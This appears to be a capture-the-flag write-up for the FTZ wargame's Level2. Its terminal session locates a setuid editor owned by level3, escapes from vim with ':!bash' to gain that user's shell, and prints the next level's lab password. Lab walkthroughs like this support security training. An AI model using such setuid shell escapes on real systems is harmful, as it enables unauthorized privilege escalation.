# Level2

## This level's goal

- Run the command in vi/vim editor

***

```
[level2@ftz level2]$ cat hint

텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...
```
```
[level2@ftz level2]$ find / -user level3 -perm -4000 2>/dev/null
/usr/bin/editor
```

```
[level2@ftz level2]$ ls -l /usr/bin/editor
-rwsr-x---    1 level3   level2      11651 Aug 19  2014 /usr/bin/editor
```

```
[level2@ftz level2]$ which vi
alias vi='vim'
        /usr/bin/vim
```

```
[level2@ftz level2]$ ls -l /bin/vi
-rwxr-xr-x    1 root     root       456108 Feb 12  2003 /bin/vi
```

```
[level2@ftz level2]$ ls -l /usr/bin/vim`
-rwxr-xr-x    1 root     root      1893740 Feb 12  2003 /usr/bin/vim
```

```
[level2@ftz level2]$ /usr/bin/editor

:!id

uid=3003(level3) gid=3002(level2) groups=3002(level2)

Hit ENTER or type command to continue

:!bash
```

```
[level3@ftz level2]$ my-pass

Level3 Password is "can you fly?".
```
